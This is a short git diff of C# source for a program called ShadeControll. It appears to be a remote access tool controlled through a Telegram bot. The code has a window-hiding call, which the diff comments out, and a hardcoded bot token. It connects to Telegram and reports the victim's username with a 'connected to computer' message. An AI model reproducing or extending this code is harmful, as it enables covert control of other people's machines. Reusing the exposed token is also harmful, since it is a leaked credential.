@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Threading;
+using System.Collections.Generic;
 using ShadeControll.Commands;
 
 namespace ShadeControll
@@ -9,7 +10,7 @@ namespace ShadeControll
         public static TelegramClient Client;
         static void Main()
         {
-            Ninja.Hide();
+            //Ninja.Hide();
             Client = new TelegramClient("1774037430:AAHnjjeOUNvn-ZpyCCo_6mIhztp_GkagsVg");
             while(!Client.Connect()) { Thread.Sleep(1000); }
             Client.SendMessage("Połączono z Komputerem - " + Environment.UserName + "\n /help");
